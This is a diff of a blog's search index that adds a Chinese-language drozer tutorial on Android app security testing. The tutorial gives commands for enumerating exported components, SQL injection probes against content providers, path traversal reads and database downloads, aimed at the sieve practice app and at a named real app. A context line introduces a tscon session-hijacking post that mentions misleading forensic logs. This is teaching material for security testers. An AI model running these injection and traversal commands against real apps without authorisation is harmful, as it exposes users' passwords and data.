@@ -3,6 +3,127 @@
   
     
     <entry>
+      <title><![CDATA[drozer使用指南]]></title>
+      <url>/20190411/drozer-guide.html</url>
+      <content type="html"><![CDATA[<p>在论坛里面看到drozer的文章有点零碎，有的只说了content provider，有的只是像文档一样比较生硬，分享一下我自己做的笔记。</p>
+<a id="more"></a>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ol>
+<li>准备一部安卓机或者模拟器，打开USB调试</li>
+<li>adb下载好，配置好环境变量</li>
+<li>下载好对应平台的 <a href="https://github.com/mwrlabs/drozer/releases/" target="_blank" rel="noopener">mwrlabs/drozer</a></li>
+</ol>
+<h2 id="Drozer安装步骤"><a href="#Drozer安装步骤" class="headerlink" title="Drozer安装步骤"></a>Drozer安装步骤</h2><ol>
+<li>需要版本为python2，已装python3需要安装python2</li>
+<li>安装库<code>drozer</code>, <code>twisted</code>, <code>service_identity</code>，命令为<code>pip install drozer twisted service_identity</code></li>
+<li>到python2安装目录下 <code>C:\Python27\Scripts</code> 查看是否有 <code>drozer.bat</code>，存在的话运行<code>drozer.bat --help</code>看是否有回显。如果你安装了多个python版本，则注意要编辑<code>drozer.bat</code> ，将 <code>python.exe</code> 改为 <code>py -2</code> 或其它你配置好的python2.exe文件名</li>
+<li>安装</li>
+<li>运行drozer错误代码为<code>10054</code>时表示手机没有在drozer APP内打开服务，错误代码<code>10061</code>时表示没有开启adb或者没有进行端口转发。</li>
+<li>查看<pre><code># 查看设备是否adb成功连接
+adb devices
+# 成功链接后，adb转发端口
+adb forward tcp:31415 tcp:31415
+# 查看端口是否开启
+netstat -ano | findstr 31415
+</code></pre></li>
+<li>推荐使用 <a href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk" target="_blank" rel="noopener">sieve.apk</a> (一个漏洞很多的示例apk)或goatdroid.app(跟webgoat同公司出的漏洞apk)用于练习drozer的漏洞发现和相关操作</li>
+</ol>
+<h2 id="Drozer检测命令"><a href="#Drozer检测命令" class="headerlink" title="Drozer检测命令"></a>Drozer检测命令</h2><h3 id="获取Android设备上的所有的安装的App的包名"><a href="#获取Android设备上的所有的安装的App的包名" class="headerlink" title="获取Android设备上的所有的安装的App的包名"></a>获取Android设备上的所有的安装的App的包名</h3><pre><code>run app.package.list
+run app.package.list -f sieve
+</code></pre><h3 id="获取APP基本信息"><a href="#获取APP基本信息" class="headerlink" title="获取APP基本信息"></a>获取APP基本信息</h3><p><code>run app.package.info -a com.aspirecn.xiaoxuntongTeacher.ln</code></p>
+<h3 id="寻找攻击面-一般测试第一步先用这个"><a href="#寻找攻击面-一般测试第一步先用这个" class="headerlink" title="寻找攻击面(一般测试第一步先用这个)"></a>寻找攻击面(一般测试第一步先用这个)</h3><p><code>run app.package.attacksurface com.aspirecn.xiaoxuntongTeacher.ln</code><br>这条命令会回显出四大组件可能存在的问题，然后再根据问题暴露点一个个对其测试。</p>
+<h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><pre><code>run app.activity.info -a com.aspirecn.xiaoxuntongTeacher.ln
+</code></pre><p>看的是这个Activity启动会不会造成越权启动或者使应用崩溃，其它的接口（微信登陆支付、小米等）暴露activity一般不造成危害的不算</p>
+<pre><code>&gt; run app.activity.start --component apk名 activity名
+run app.activity.start --component com.aspirecn.xiaoxuntongTeacher.ln com.aspirecn.xiaoxuntongTeacher.ln.ui.Main
+
+run app.activity.start --component com.aspirecn.xiaoxuntongTeacher.ln  com.aspirecn.xiaoxuntongTeacher.ln.activity.DoctorListActivity
+</code></pre><h3 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h3><ol>
+<li><p>获取Content Provider信息</p>
+<pre><code>run app.provider.info -a com.aspirecn.xiaoxuntongTeacher.ln
+</code></pre></li>
+<li><p>Content Providers（数据泄露）<br>先获取所有可以访问的Uri：</p>
+<pre><code>run scanner.provider.finduris -a com.aspirecn.xiaoxuntongTeacher.ln
+</code></pre><p>获取各个Uri的数据：</p>
+<pre><code>run app.provider.query content:// com.aspirecn.xiaoxuntongTeacher.ln.DBContentProvider/Passwords/ --vertical
+</code></pre><p>查询到数据说明存在漏洞</p>
+</li>
+<li><p>Content Providers（SQL注入）</p>
+<pre><code>run app.provider.query content:// com.aspirecn.xiaoxuntongTeacher.ln.DBContentProvider/Passwords/ --projection &quot;&#39;&quot;
+run app.provider.query content:// com.aspirecn.xiaoxuntongTeacher.ln.DBContentProvider/Passwords/ --selection &quot;&#39;&quot;
+</code></pre><p>报错则说明存在SQL注入。<br>列出所有表：</p>
+<pre><code>run app.provider.query content:// com.aspirecn.xiaoxuntongTeacher.ln.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#39;table&#39;;--&quot;
+</code></pre><p>获取某个表（如Key）中的数据：</p>
+<pre><code>run app.provider.query content:// com.aspirecn.xiaoxuntongTeacher.ln.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;
+</code></pre></li>
+<li><p>同时检测SQL注入和目录遍历（！优先用这条！）</p>
+<pre><code>run scanner.provider.injection -a com.aspirecn.xiaoxuntongTeacher.ln
+run scanner.provider.traversal -a com.aspirecn.xiaoxuntongTeacher.ln
+</code></pre></li>
+</ol>
+<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>测试某个Service，一般需要读源码看是否有漏洞</p>
+<pre><code>run app.service.info -a com.aspirecn.xiaoxuntongTeacher.ln
+run app.service.send com.aspirecn.xiaoxuntongTeacher.ln com.aspirecn.xiaoxuntongTeacher.ln.CryptoService --msg 1 5 3
+</code></pre><h3 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h3><p>测试某个broadcast，一般需要读源码看是否有漏洞</p>
+<pre><code>run app.broadcast.info -a com.aspirecn.xiaoxuntongTeacher.ln
+</code></pre><h2 id="另附drozer常用命令"><a href="#另附drozer常用命令" class="headerlink" title="另附drozer常用命令"></a>另附drozer常用命令</h2><pre><code>&gt; list  //列出目前可用的模块，也可以使用ls
+&gt; help app.activity.forintent       //查看指定模块的帮助信息
+&gt; run app.package.list      //列出android设备中安装的app
+&gt; run app.package.info -a com.android.browser     //查看指定app的基本信息
+&gt; run app.activity.info -a com.android.browser      //列出app中的activity组件
+&gt; run app.activity.start --action android.intent.action.VIEW --data-uri  http://www.google.com  //开启一个activity，例如运行浏览器打开谷歌页面
+&gt; run scanner.provider.finduris -a com.sina.weibo       //查找可以读取的Content Provider
+&gt; run app.provider.query content://settings/secure --selection &quot;name=&#39;adb_enabled&#39;&quot;    //读取指定Content Provider内容
+&gt; run scanner.misc.writablefiles --privileged /data/data/com.sina.weibo     //列出指定文件路径里全局可写/可读的文件
+&gt; run shell.start       //shell操作
+&gt; run tools.setup.busybox       //安装busybox
+&gt; list auxiliary        //通过web的方式查看content provider组件的相关内容
+&gt; help auxiliary.webcontentresolver     //webcontentresolver帮助
+&gt; run auxiliary.webcontentresolver      //执行在浏览器中以http://localhost:8080即可访问
+以sieve为例
+&gt; run app.package.list -f sieve         //查找sieve应用程序
+&gt; run app.package.info -a com.mwr.example.sieve         //显示app.package.info命令包的基本信息
+&gt; run app.package.attacksurface com.mwr.example.sieve   //确定攻击面
+&gt; run app.activity.info -a com.mwr.example.sieve         //获取activity信息
+&gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     //启动pwlist
+&gt; run app.provider.info -a com.mwr.example.sieve        //提供商信息
+&gt; run scanner.provider.finduris -a com.mwr.example.sieve        //扫描所有能访问地址 
+&gt; run  app.provider.query content://com.mwr.example.DBContentProvider/Passwords/--vertical  //查看DBContentProvider/Passwords这条可执行地址
+&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#39;&quot;   //检测注入
+&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts    //查看读权限数据
+&gt; run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db //下载数据
+&gt; run scanner.provider.injection -a com.mwr.example.sieve       //扫描注入地址
+&gt; run scanner.provider.traversal -a com.mwr.example.sieve
+&gt; run app.service.info -a com.mwr.example.sieve         //查看服务
+
+&gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     //启动pwlist
+&gt; run app.provider.info -a com.mwr.example.sieve        //提供商信息
+&gt; run scanner.provider.finduris -a com.mwr.example.sieve        //扫描所有能访问地址 
+&gt; run  app.provider.query content://com.mwr.example.DBContentProvider/Passwords/--vertical  //查看DBContentProvider/Passwords这条可执行地址
+&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#39;&quot;   //检测注入
+&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts    //查看读权限数据
+&gt; run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db //下载数据
+&gt; run scanner.provider.injection -a com.mwr.example.sieve       //扫描注入地址
+&gt; run scanner.provider.traversal -a com.mwr.example.sieve
+&gt; run app.service.info -a com.mwr.example.sieve         //查看服务
+
+</code></pre>]]></content>
+      
+        <categories>
+            
+            <category> 安卓 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 安卓 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Tscon未授权登陆远程桌面]]></title>
       <url>/20190408/tscon%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E9%99%86%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.html</url>
       <content type="html"><![CDATA[<p>运用 <code>tscon</code> 该特性可以达到某些<strong>横向移动</strong>的场景，达成未授权登陆其它用户的远程桌面会话，或者使用该特性切换到其它用户进行恶意行为，那么事件日志里面记录的是其它用户的操作，从而避免或者恶意引导应急响应人员的取证。</p>
@@ -1877,14 +1998,14 @@ print kk
     </entry>
     
     <entry>
-      <title><![CDATA[标签云]]></title>
-      <url>/tags/index.html</url>
+      <title><![CDATA[时间轴]]></title>
+      <url>/timeline/index.html</url>
       <content type="html"></content>
     </entry>
     
     <entry>
-      <title><![CDATA[时间轴]]></title>
-      <url>/timeline/index.html</url>
+      <title><![CDATA[标签云]]></title>
+      <url>/tags/index.html</url>
       <content type="html"></content>
     </entry>
     
